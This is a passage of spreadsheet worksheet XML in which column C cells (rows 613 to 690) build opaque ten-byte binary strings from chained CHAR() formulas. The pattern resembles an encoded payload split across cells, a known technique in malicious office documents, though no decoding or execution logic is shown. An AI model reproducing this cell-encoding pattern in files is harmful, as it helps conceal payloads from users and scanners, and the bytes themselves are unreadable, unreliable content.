        <f>CHAR(171)&amp;CHAR(138)&amp;CHAR(112)&amp;CHAR(245)&amp;CHAR(137)&amp;CHAR(154)&amp;CHAR(100)&amp;CHAR(246)&amp;CHAR(174)&amp;CHAR(130)</f>
        <v>«Špõ‰šdö®‚</v>
      </c>
    </row>
    <row r="613" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C613" t="str">
        <f>CHAR(123)&amp;CHAR(177)&amp;CHAR(145)&amp;CHAR(141)&amp;CHAR(117)&amp;CHAR(250)&amp;CHAR(184)&amp;CHAR(128)&amp;CHAR(112)&amp;CHAR(229)</f>
        <v>{±‘uú¸€på</v>
      </c>
    </row>
    <row r="614" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C614" t="str">
        <f>CHAR(147)&amp;CHAR(144)&amp;CHAR(117)&amp;CHAR(165)&amp;CHAR(168)&amp;CHAR(138)&amp;CHAR(106)&amp;CHAR(238)&amp;CHAR(149)&amp;CHAR(135)</f>
        <v>“u¥¨Šjî•‡</v>
      </c>
    </row>
    <row r="615" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C615" t="str">
        <f>CHAR(111)&amp;CHAR(241)&amp;CHAR(190)&amp;CHAR(151)&amp;CHAR(106)&amp;CHAR(177)&amp;CHAR(133)&amp;CHAR(141)&amp;CHAR(117)&amp;CHAR(250)</f>
        <v>oñ¾—j±…uú</v>
      </c>
    </row>
    <row r="616" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C616" t="str">
        <f>CHAR(178)&amp;CHAR(129)&amp;CHAR(120)&amp;CHAR(254)&amp;CHAR(132)&amp;CHAR(133)&amp;CHAR(96)&amp;CHAR(241)&amp;CHAR(178)&amp;CHAR(128)</f>
        <v>²xþ„…`ñ²€</v>
      </c>
    </row>
    <row r="617" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C617" t="str">
        <f>CHAR(112)&amp;CHAR(177)&amp;CHAR(135)&amp;CHAR(157)&amp;CHAR(100)&amp;CHAR(247)&amp;CHAR(162)&amp;CHAR(144)&amp;CHAR(119)&amp;CHAR(255)</f>
        <v>p±‡d÷¢wÿ</v>
      </c>
    </row>
    <row r="618" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C618" t="str">
        <f>CHAR(144)&amp;CHAR(135)&amp;CHAR(115)&amp;CHAR(232)&amp;CHAR(186)&amp;CHAR(155)&amp;CHAR(119)&amp;CHAR(254)&amp;CHAR(152)&amp;CHAR(200)</f>
        <v>‡sèº›wþ˜È</v>
      </c>
    </row>
    <row r="619" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C619" t="str">
        <f>CHAR(114)&amp;CHAR(224)&amp;CHAR(175)&amp;CHAR(144)&amp;CHAR(106)&amp;CHAR(249)&amp;CHAR(132)&amp;CHAR(141)&amp;CHAR(96)&amp;CHAR(225)</f>
        <v>rà¯jù„`á</v>
      </c>
    </row>
    <row r="620" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C620" t="str">
        <f>CHAR(164)&amp;CHAR(155)&amp;CHAR(113)&amp;CHAR(250)&amp;CHAR(147)&amp;CHAR(134)&amp;CHAR(33)&amp;CHAR(236)&amp;CHAR(182)&amp;CHAR(159)</f>
        <v>¤›qú“†!ì¶Ÿ</v>
      </c>
    </row>
    <row r="621" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C621" t="str">
        <f>CHAR(123)&amp;CHAR(227)&amp;CHAR(133)&amp;CHAR(135)&amp;CHAR(111)&amp;CHAR(228)&amp;CHAR(175)&amp;CHAR(138)&amp;CHAR(62)&amp;CHAR(245)</f>
        <v>{ã…‡oä¯Š&gt;õ</v>
      </c>
    </row>
    <row r="622" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C622" t="str">
        <f>CHAR(159)&amp;CHAR(154)&amp;CHAR(100)&amp;CHAR(230)&amp;CHAR(175)&amp;CHAR(144)&amp;CHAR(119)&amp;CHAR(252)&amp;CHAR(134)&amp;CHAR(141)</f>
        <v>Ÿšdæ¯wü†</v>
      </c>
    </row>
    <row r="623" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C623" t="str">
        <f>CHAR(115)&amp;CHAR(246)&amp;CHAR(180)&amp;CHAR(129)&amp;CHAR(127)&amp;CHAR(229)&amp;CHAR(159)&amp;CHAR(135)&amp;CHAR(111)&amp;CHAR(165)</f>
        <v>sö´åŸ‡o¥</v>
      </c>
    </row>
    <row r="624" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C624" t="str">
        <f>CHAR(174)&amp;CHAR(161)&amp;CHAR(72)&amp;CHAR(212)&amp;CHAR(164)&amp;CHAR(161)&amp;CHAR(71)&amp;CHAR(204)&amp;CHAR(154)&amp;CHAR(173)</f>
        <v>®¡HÔ¤¡GÌš­</v>
      </c>
    </row>
    <row r="625" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C625" t="str">
        <f>CHAR(82)&amp;CHAR(212)&amp;CHAR(149)&amp;CHAR(167)&amp;CHAR(69)&amp;CHAR(192)&amp;CHAR(186)&amp;CHAR(187)&amp;CHAR(74)&amp;CHAR(195)</f>
        <v>RÔ•§EÀº»JÃ</v>
      </c>
    </row>
    <row r="626" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C626" t="str">
        <f>CHAR(191)&amp;CHAR(170)&amp;CHAR(84)&amp;CHAR(209)&amp;CHAR(158)&amp;CHAR(207)&amp;CHAR(109)&amp;CHAR(200)&amp;CHAR(165)&amp;CHAR(188)</f>
        <v>¿ªTÑžÏmÈ¥¼</v>
      </c>
    </row>
    <row r="627" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C627" t="str">
        <f>CHAR(68)&amp;CHAR(200)&amp;CHAR(213)&amp;CHAR(156)&amp;CHAR(91)&amp;CHAR(210)&amp;CHAR(163)&amp;CHAR(186)&amp;CHAR(72)&amp;CHAR(209)</f>
        <v>DÈÕœ[Ò£ºHÑ</v>
      </c>
    </row>
    <row r="628" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C628" t="str">
        <f>CHAR(130)&amp;CHAR(207)&amp;CHAR(16)&amp;CHAR(210)&amp;CHAR(162)&amp;CHAR(167)&amp;CHAR(83)&amp;CHAR(165)&amp;CHAR(185)&amp;CHAR(182)</f>
        <v>‚Ï_x0010_Ò¢§S¥¹¶</v>
      </c>
    </row>
    <row r="629" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C629" t="str">
        <f>CHAR(74)&amp;CHAR(212)&amp;CHAR(214)&amp;CHAR(155)&amp;CHAR(88)&amp;CHAR(214)&amp;CHAR(143)&amp;CHAR(170)&amp;CHAR(83)&amp;CHAR(177)</f>
        <v>JÔÖ›XÖªS±</v>
      </c>
    </row>
    <row r="630" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C630" t="str">
        <f>CHAR(234)&amp;CHAR(152)&amp;CHAR(83)&amp;CHAR(204)&amp;CHAR(141)&amp;CHAR(174)&amp;CHAR(74)&amp;CHAR(212)&amp;CHAR(159)&amp;CHAR(165)</f>
        <v>ê˜SÌ®JÔŸ¥</v>
      </c>
    </row>
    <row r="631" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C631" t="str">
        <f>CHAR(81)&amp;CHAR(201)&amp;CHAR(158)&amp;CHAR(162)&amp;CHAR(91)&amp;CHAR(223)&amp;CHAR(162)&amp;CHAR(169)&amp;CHAR(85)&amp;CHAR(204)</f>
        <v>QÉž¢[ß¢©UÌ</v>
      </c>
    </row>
    <row r="632" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C632" t="str">
        <f>CHAR(148)&amp;CHAR(161)&amp;CHAR(122)&amp;CHAR(212)&amp;CHAR(162)&amp;CHAR(169)&amp;CHAR(72)&amp;CHAR(201)&amp;CHAR(136)&amp;CHAR(241)</f>
        <v>”¡zÔ¢©HÉˆñ</v>
      </c>
    </row>
    <row r="633" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C633" t="str">
        <f>CHAR(62)&amp;CHAR(149)&amp;CHAR(151)&amp;CHAR(186)&amp;CHAR(83)&amp;CHAR(196)&amp;CHAR(130)&amp;CHAR(155)&amp;CHAR(71)&amp;CHAR(193)</f>
        <v>&gt;•—ºSÄ‚›GÁ</v>
      </c>
    </row>
    <row r="634" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C634" t="str">
        <f>CHAR(179)&amp;CHAR(245)&amp;CHAR(18)&amp;CHAR(144)&amp;CHAR(205)&amp;CHAR(207)&amp;CHAR(26)&amp;CHAR(215)&amp;CHAR(191)&amp;CHAR(173)</f>
        <v>³õ_x0012_ÍÏ_x001A_×¿­</v>
      </c>
    </row>
    <row r="635" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C635" t="str">
        <f>CHAR(77)&amp;CHAR(193)&amp;CHAR(214)&amp;CHAR(248)&amp;CHAR(12)&amp;CHAR(243)&amp;CHAR(238)&amp;CHAR(240)&amp;CHAR(98)&amp;CHAR(231)</f>
        <v>MÁÖø_x000C_óîðbç</v>
      </c>
    </row>
    <row r="636" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C636" t="str">
        <f>CHAR(205)&amp;CHAR(247)&amp;CHAR(15)&amp;CHAR(244)&amp;CHAR(227)&amp;CHAR(252)&amp;CHAR(22)&amp;CHAR(231)&amp;CHAR(186)&amp;CHAR(252)</f>
        <v>Í÷_x000F_ôãü_x0016_çºü</v>
      </c>
    </row>
    <row r="637" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C637" t="str">
        <f>CHAR(6)&amp;CHAR(136)&amp;CHAR(144)&amp;CHAR(138)&amp;CHAR(20)&amp;CHAR(146)&amp;CHAR(190)&amp;CHAR(253)&amp;CHAR(15)&amp;CHAR(247)</f>
        <v>_x0006_ˆŠ_x0014_’¾ý_x000F_÷</v>
      </c>
    </row>
    <row r="638" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C638" t="str">
        <f>CHAR(151)&amp;CHAR(140)&amp;CHAR(16)&amp;CHAR(228)&amp;CHAR(200)&amp;CHAR(251)&amp;CHAR(14)&amp;CHAR(244)&amp;CHAR(149)&amp;CHAR(139)</f>
        <v>—Œ_x0010_äÈû_x000E_ô•‹</v>
      </c>
    </row>
    <row r="639" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C639" t="str">
        <f>CHAR(100)&amp;CHAR(146)&amp;CHAR(195)&amp;CHAR(207)&amp;CHAR(108)&amp;CHAR(196)&amp;CHAR(184)&amp;CHAR(188)&amp;CHAR(72)&amp;CHAR(200)</f>
        <v>d’ÃÏlÄ¸¼HÈ</v>
      </c>
    </row>
    <row r="640" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C640" t="str">
        <f>CHAR(158)&amp;CHAR(135)&amp;CHAR(91)&amp;CHAR(221)&amp;CHAR(166)&amp;CHAR(173)&amp;CHAR(83)&amp;CHAR(214)&amp;CHAR(251)&amp;CHAR(156)</f>
        <v>ž‡[Ý¦­SÖûœ</v>
      </c>
    </row>
    <row r="641" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C641" t="str">
        <f>CHAR(71)&amp;CHAR(194)&amp;CHAR(162)&amp;CHAR(173)&amp;CHAR(76)&amp;CHAR(139)&amp;CHAR(169)&amp;CHAR(186)&amp;CHAR(80)&amp;CHAR(197)</f>
        <v>GÂ¢­L‹©ºPÅ</v>
      </c>
    </row>
    <row r="642" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C642" t="str">
        <f>CHAR(191)&amp;CHAR(165)&amp;CHAR(68)&amp;CHAR(139)&amp;CHAR(184)&amp;CHAR(160)&amp;CHAR(83)&amp;CHAR(193)&amp;CHAR(191)&amp;CHAR(164)</f>
        <v>¿¥D‹¸ SÁ¿¤</v>
      </c>
    </row>
    <row r="643" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C643" t="str">
        <f>CHAR(68)&amp;CHAR(215)&amp;CHAR(168)&amp;CHAR(170)&amp;CHAR(76)&amp;CHAR(199)&amp;CHAR(191)&amp;CHAR(171)&amp;CHAR(68)&amp;CHAR(214)</f>
        <v>D×¨ªLÇ¿«DÖ</v>
      </c>
    </row>
    <row r="644" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C644" t="str">
        <f>CHAR(251)&amp;CHAR(134)&amp;CHAR(80)&amp;CHAR(216)&amp;CHAR(162)&amp;CHAR(161)&amp;CHAR(64)&amp;CHAR(201)&amp;CHAR(146)&amp;CHAR(181)</f>
        <v>û†PØ¢¡@É’µ</v>
      </c>
    </row>
    <row r="645" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C645" t="str">
        <f>CHAR(91)&amp;CHAR(240)&amp;CHAR(164)&amp;CHAR(186)&amp;CHAR(64)&amp;CHAR(220)&amp;CHAR(251)&amp;CHAR(142)&amp;CHAR(76)&amp;CHAR(195)</f>
        <v>[ð¤º@ÜûŽLÃ</v>
      </c>
    </row>
    <row r="646" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C646" t="str">
        <f>CHAR(183)&amp;CHAR(177)&amp;CHAR(33)&amp;CHAR(247)&amp;CHAR(142)&amp;CHAR(161)&amp;CHAR(74)&amp;CHAR(216)&amp;CHAR(187)&amp;CHAR(173)</f>
        <v>·±!÷Ž¡JØ»­</v>
      </c>
    </row>
    <row r="647" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C647" t="str">
        <f>CHAR(103)&amp;CHAR(204)&amp;CHAR(158)&amp;CHAR(163)&amp;CHAR(90)&amp;CHAR(249)&amp;CHAR(183)&amp;CHAR(166)&amp;CHAR(69)&amp;CHAR(201)</f>
        <v>gÌž£Zù·¦EÉ</v>
      </c>
    </row>
    <row r="648" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C648" t="str">
        <f>CHAR(158)&amp;CHAR(207)&amp;CHAR(119)&amp;CHAR(223)&amp;CHAR(162)&amp;CHAR(152)&amp;CHAR(85)&amp;CHAR(215)&amp;CHAR(251)&amp;CHAR(149)</f>
        <v>žÏwß¢˜U×û•</v>
      </c>
    </row>
    <row r="649" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C649" t="str">
        <f>CHAR(91)&amp;CHAR(195)&amp;CHAR(185)&amp;CHAR(200)&amp;CHAR(113)&amp;CHAR(215)&amp;CHAR(148)&amp;CHAR(172)&amp;CHAR(91)&amp;CHAR(194)</f>
        <v>[Ã¹Èq×”¬[Â</v>
      </c>
    </row>
    <row r="650" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C650" t="str">
        <f>CHAR(165)&amp;CHAR(200)&amp;CHAR(114)&amp;CHAR(220)&amp;CHAR(136)&amp;CHAR(187)&amp;CHAR(91)&amp;CHAR(220)&amp;CHAR(248)&amp;CHAR(140)</f>
        <v>¥ÈrÜˆ»[ÜøŒ</v>
      </c>
    </row>
    <row r="651" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C651" t="str">
        <f>CHAR(72)&amp;CHAR(196)&amp;CHAR(156)&amp;CHAR(161)&amp;CHAR(81)&amp;CHAR(194)&amp;CHAR(162)&amp;CHAR(161)&amp;CHAR(66)&amp;CHAR(214)</f>
        <v>HÄœ¡QÂ¢¡BÖ</v>
      </c>
    </row>
    <row r="652" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C652" t="str">
        <f>CHAR(251)&amp;CHAR(136)&amp;CHAR(91)&amp;CHAR(197)&amp;CHAR(134)&amp;CHAR(186)&amp;CHAR(78)&amp;CHAR(198)&amp;CHAR(158)&amp;CHAR(188)</f>
        <v>ûˆ[Å†ºNÆž¼</v>
      </c>
    </row>
    <row r="653" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C653" t="str">
        <f>CHAR(77)&amp;CHAR(243)&amp;CHAR(175)&amp;CHAR(129)&amp;CHAR(69)&amp;CHAR(165)&amp;CHAR(171)&amp;CHAR(189)&amp;CHAR(81)&amp;CHAR(210)</f>
        <v>Mó¯E¥«½QÒ</v>
      </c>
    </row>
    <row r="654" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C654" t="str">
        <f>CHAR(179)&amp;CHAR(187)&amp;CHAR(82)&amp;CHAR(241)&amp;CHAR(147)&amp;CHAR(189)&amp;CHAR(91)&amp;CHAR(208)&amp;CHAR(178)&amp;CHAR(139)</f>
        <v>³»Rñ“½[Ð²‹</v>
      </c>
    </row>
    <row r="655" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C655" t="str">
        <f>CHAR(78)&amp;CHAR(201)&amp;CHAR(151)&amp;CHAR(170)&amp;CHAR(93)&amp;CHAR(197)&amp;CHAR(191)&amp;CHAR(167)&amp;CHAR(79)&amp;CHAR(165)</f>
        <v>NÉ—ª]Å¿§O¥</v>
      </c>
    </row>
    <row r="656" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C656" t="str">
        <f>CHAR(156)&amp;CHAR(170)&amp;CHAR(74)&amp;CHAR(238)&amp;CHAR(130)&amp;CHAR(160)&amp;CHAR(83)&amp;CHAR(192)&amp;CHAR(154)&amp;CHAR(171)</f>
        <v>œªJî‚ SÀš«</v>
      </c>
    </row>
    <row r="657" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C657" t="str">
        <f>CHAR(77)&amp;CHAR(177)&amp;CHAR(177)&amp;CHAR(173)&amp;CHAR(85)&amp;CHAR(250)&amp;CHAR(178)&amp;CHAR(187)&amp;CHAR(91)&amp;CHAR(220)</f>
        <v>M±±­Uú²»[Ü</v>
      </c>
    </row>
    <row r="658" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C658" t="str">
        <f>CHAR(214)&amp;CHAR(152)&amp;CHAR(83)&amp;CHAR(202)&amp;CHAR(152)&amp;CHAR(170)&amp;CHAR(77)&amp;CHAR(194)&amp;CHAR(130)&amp;CHAR(160)</f>
        <v>Ö˜SÊ˜ªMÂ‚ </v>
      </c>
    </row>
    <row r="659" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C659" t="str">
        <f>CHAR(83)&amp;CHAR(192)&amp;CHAR(154)&amp;CHAR(171)&amp;CHAR(62)&amp;CHAR(214)&amp;CHAR(179)&amp;CHAR(188)&amp;CHAR(126)&amp;CHAR(236)</f>
        <v>SÀš«&gt;Ö³¼~ì</v>
      </c>
    </row>
    <row r="660" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C660" t="str">
        <f>CHAR(159)&amp;CHAR(207)&amp;CHAR(120)&amp;CHAR(221)&amp;CHAR(183)&amp;CHAR(175)&amp;CHAR(82)&amp;CHAR(228)&amp;CHAR(143)&amp;CHAR(187)</f>
        <v>ŸÏxÝ·¯Rä»</v>
      </c>
    </row>
    <row r="661" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C661" t="str">
        <f>CHAR(76)&amp;CHAR(216)&amp;CHAR(180)&amp;CHAR(189)&amp;CHAR(85)&amp;CHAR(192)&amp;CHAR(251)&amp;CHAR(128)&amp;CHAR(78)&amp;CHAR(212)</f>
        <v>LØ´½UÀû€NÔ</v>
      </c>
    </row>
    <row r="662" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C662" t="str">
        <f>CHAR(184)&amp;CHAR(156)&amp;CHAR(73)&amp;CHAR(215)&amp;CHAR(158)&amp;CHAR(174)&amp;CHAR(90)&amp;CHAR(177)&amp;CHAR(189)&amp;CHAR(173)</f>
        <v>¸œI×ž®Z±½­</v>
      </c>
    </row>
    <row r="663" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C663" t="str">
        <f>CHAR(83)&amp;CHAR(203)&amp;CHAR(158)&amp;CHAR(163)&amp;CHAR(13)&amp;CHAR(131)&amp;CHAR(248)&amp;CHAR(172)&amp;CHAR(77)&amp;CHAR(201)</f>
        <v>SËž£_x000D_ƒø¬MÉ</v>
      </c>
    </row>
    <row r="664" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C664" t="str">
        <f>CHAR(251)&amp;CHAR(171)&amp;CHAR(73)&amp;CHAR(245)&amp;CHAR(179)&amp;CHAR(187)&amp;CHAR(72)&amp;CHAR(215)&amp;CHAR(158)&amp;CHAR(171)</f>
        <v>û«Iõ³»H×ž«</v>
      </c>
    </row>
    <row r="665" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C665" t="str">
        <f>CHAR(127)&amp;CHAR(210)&amp;CHAR(181)&amp;CHAR(173)&amp;CHAR(82)&amp;CHAR(214)&amp;CHAR(251)&amp;CHAR(173)&amp;CHAR(119)&amp;CHAR(223)</f>
        <v>Òµ­RÖû­wß</v>
      </c>
    </row>
    <row r="666" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C666" t="str">
        <f>CHAR(190)&amp;CHAR(173)&amp;CHAR(83)&amp;CHAR(204)&amp;CHAR(143)&amp;CHAR(135)&amp;CHAR(95)&amp;CHAR(223)&amp;CHAR(178)&amp;CHAR(164)</f>
        <v>¾­SÌ‡_ß²¤</v>
      </c>
    </row>
    <row r="667" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C667" t="str">
        <f>CHAR(68)&amp;CHAR(165)&amp;CHAR(172)&amp;CHAR(189)&amp;CHAR(87)&amp;CHAR(197)&amp;CHAR(179)&amp;CHAR(152)&amp;CHAR(83)&amp;CHAR(202)</f>
        <v>D¥¬½WÅ³˜SÊ</v>
      </c>
    </row>
    <row r="668" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C668" t="str">
        <f>CHAR(152)&amp;CHAR(170)&amp;CHAR(77)&amp;CHAR(194)&amp;CHAR(155)&amp;CHAR(173)&amp;CHAR(76)&amp;CHAR(202)&amp;CHAR(137)&amp;CHAR(182)</f>
        <v>˜ªMÂ›­LÊ‰¶</v>
      </c>
    </row>
    <row r="669" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C669" t="str">
        <f>CHAR(62)&amp;CHAR(221)&amp;CHAR(166)&amp;CHAR(138)&amp;CHAR(64)&amp;CHAR(214)&amp;CHAR(158)&amp;CHAR(142)&amp;CHAR(90)&amp;CHAR(213)</f>
        <v>&gt;Ý¦Š@ÖžŽZÕ</v>
      </c>
    </row>
    <row r="670" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C670" t="str">
        <f>CHAR(164)&amp;CHAR(173)&amp;CHAR(82)&amp;CHAR(214)&amp;CHAR(251)&amp;CHAR(163)&amp;CHAR(78)&amp;CHAR(243)&amp;CHAR(163)&amp;CHAR(174)</f>
        <v>¤­RÖû£Nó£®</v>
      </c>
    </row>
    <row r="671" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C671" t="str">
        <f>CHAR(71)&amp;CHAR(192)&amp;CHAR(137)&amp;CHAR(207)&amp;CHAR(80)&amp;CHAR(226)&amp;CHAR(191)&amp;CHAR(178)&amp;CHAR(68)&amp;CHAR(165)</f>
        <v>GÀ‰ÏPâ¿²D¥</v>
      </c>
    </row>
    <row r="672" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C672" t="str">
        <f>CHAR(151)&amp;CHAR(191)&amp;CHAR(112)&amp;CHAR(196)&amp;CHAR(187)&amp;CHAR(170)&amp;CHAR(68)&amp;CHAR(215)&amp;CHAR(180)&amp;CHAR(169)</f>
        <v>—¿pÄ»ªD×´©</v>
      </c>
    </row>
    <row r="673" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C673" t="str">
        <f>CHAR(124)&amp;CHAR(200)&amp;CHAR(162)&amp;CHAR(173)&amp;CHAR(82)&amp;CHAR(242)&amp;CHAR(137)&amp;CHAR(166)&amp;CHAR(74)&amp;CHAR(197)</f>
        <v>|È¢­Rò‰¦JÅ</v>
      </c>
    </row>
    <row r="674" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C674" t="str">
        <f>CHAR(179)&amp;CHAR(166)&amp;CHAR(33)&amp;CHAR(244)&amp;CHAR(142)&amp;CHAR(170)&amp;CHAR(75)&amp;CHAR(212)&amp;CHAR(131)&amp;CHAR(187)</f>
        <v>³¦!ôŽªKÔƒ»</v>
      </c>
    </row>
    <row r="675" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C675" t="str">
        <f>CHAR(68)&amp;CHAR(215)&amp;CHAR(186)&amp;CHAR(159)&amp;CHAR(125)&amp;CHAR(177)&amp;CHAR(166)&amp;CHAR(174)&amp;CHAR(79)&amp;CHAR(228)</f>
        <v>D×ºŸ}±¦®Oä</v>
      </c>
    </row>
    <row r="676" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C676" t="str">
        <f>CHAR(171)&amp;CHAR(140)&amp;CHAR(62)&amp;CHAR(213)&amp;CHAR(161)&amp;CHAR(140)&amp;CHAR(64)&amp;CHAR(209)&amp;CHAR(154)&amp;CHAR(207)</f>
        <v>«Œ&gt;Õ¡Œ@ÑšÏ</v>
      </c>
    </row>
    <row r="677" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C677" t="str">
        <f>CHAR(104)&amp;CHAR(216)&amp;CHAR(164)&amp;CHAR(188)&amp;CHAR(84)&amp;CHAR(196)&amp;CHAR(151)&amp;CHAR(142)&amp;CHAR(82)&amp;CHAR(221)</f>
        <v>hØ¤¼TÄ—ŽRÝ</v>
      </c>
    </row>
    <row r="678" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C678" t="str">
        <f>CHAR(185)&amp;CHAR(171)&amp;CHAR(100)&amp;CHAR(221)&amp;CHAR(251)&amp;CHAR(163)&amp;CHAR(78)&amp;CHAR(240)&amp;CHAR(178)&amp;CHAR(172)</f>
        <v>¹«dÝû£Nð²¬</v>
      </c>
    </row>
    <row r="679" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C679" t="str">
        <f>CHAR(83)&amp;CHAR(192)&amp;CHAR(136)&amp;CHAR(188)&amp;CHAR(62)&amp;CHAR(213)&amp;CHAR(161)&amp;CHAR(155)&amp;CHAR(72)&amp;CHAR(223)</f>
        <v>SÀˆ¼&gt;Õ¡›Hß</v>
      </c>
    </row>
    <row r="680" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C680" t="str">
        <f>CHAR(158)&amp;CHAR(207)&amp;CHAR(88)&amp;CHAR(221)&amp;CHAR(151)&amp;CHAR(164)&amp;CHAR(77)&amp;CHAR(202)&amp;CHAR(152)&amp;CHAR(174)</f>
        <v>žÏXÝ—¤MÊ˜®</v>
      </c>
    </row>
    <row r="681" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C681" t="str">
        <f>CHAR(74)&amp;CHAR(216)&amp;CHAR(185)&amp;CHAR(166)&amp;CHAR(117)&amp;CHAR(220)&amp;CHAR(139)&amp;CHAR(170)&amp;CHAR(62)&amp;CHAR(215)</f>
        <v>JØ¹¦uÜ‹ª&gt;×</v>
      </c>
    </row>
    <row r="682" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C682" t="str">
        <f>CHAR(186)&amp;CHAR(152)&amp;CHAR(83)&amp;CHAR(202)&amp;CHAR(143)&amp;CHAR(170)&amp;CHAR(93)&amp;CHAR(197)&amp;CHAR(214)&amp;CHAR(158)</f>
        <v>º˜SÊª]ÅÖž</v>
      </c>
    </row>
    <row r="683" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C683" t="str">
        <f>CHAR(72)&amp;CHAR(215)&amp;CHAR(143)&amp;CHAR(186)&amp;CHAR(95)&amp;CHAR(221)&amp;CHAR(134)&amp;CHAR(186)&amp;CHAR(78)&amp;CHAR(209)</f>
        <v>H×º_Ý†ºNÑ</v>
      </c>
    </row>
    <row r="684" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C684" t="str">
        <f>CHAR(158)&amp;CHAR(172)&amp;CHAR(74)&amp;CHAR(244)&amp;CHAR(174)&amp;CHAR(200)&amp;CHAR(71)&amp;CHAR(201)&amp;CHAR(181)&amp;CHAR(170)</f>
        <v>ž¬Jô®ÈGÉµª</v>
      </c>
    </row>
    <row r="685" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C685" t="str">
        <f>CHAR(73)&amp;CHAR(225)&amp;CHAR(164)&amp;CHAR(167)&amp;CHAR(85)&amp;CHAR(192)&amp;CHAR(152)&amp;CHAR(187)&amp;CHAR(62)&amp;CHAR(221)</f>
        <v>Iá¤§UÀ˜»&gt;Ý</v>
      </c>
    </row>
    <row r="686" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C686" t="str">
        <f>CHAR(166)&amp;CHAR(174)&amp;CHAR(77)&amp;CHAR(234)&amp;CHAR(151)&amp;CHAR(171)&amp;CHAR(110)&amp;CHAR(195)&amp;CHAR(185)&amp;CHAR(188)</f>
        <v>¦®Mê—«nÃ¹¼</v>
      </c>
    </row>
    <row r="687" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C687" t="str">
        <f>CHAR(68)&amp;CHAR(198)&amp;CHAR(143)&amp;CHAR(207)&amp;CHAR(82)&amp;CHAR(193)&amp;CHAR(151)&amp;CHAR(184)&amp;CHAR(81)&amp;CHAR(201)</f>
        <v>DÆÏRÁ—¸QÉ</v>
      </c>
    </row>
    <row r="688" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C688" t="str">
        <f>CHAR(146)&amp;CHAR(172)&amp;CHAR(95)&amp;CHAR(197)&amp;CHAR(191)&amp;CHAR(167)&amp;CHAR(79)&amp;CHAR(235)&amp;CHAR(154)&amp;CHAR(162)</f>
        <v>’¬_Å¿§Oëš¢</v>
      </c>
    </row>
    <row r="689" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C689" t="str">
        <f>CHAR(91)&amp;CHAR(177)&amp;CHAR(186)&amp;CHAR(184)&amp;CHAR(98)&amp;CHAR(202)&amp;CHAR(150)&amp;CHAR(162)&amp;CHAR(95)&amp;CHAR(223)</f>
        <v>[±º¸bÊ–¢_ß</v>
      </c>
    </row>
    <row r="690" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C690" t="str">
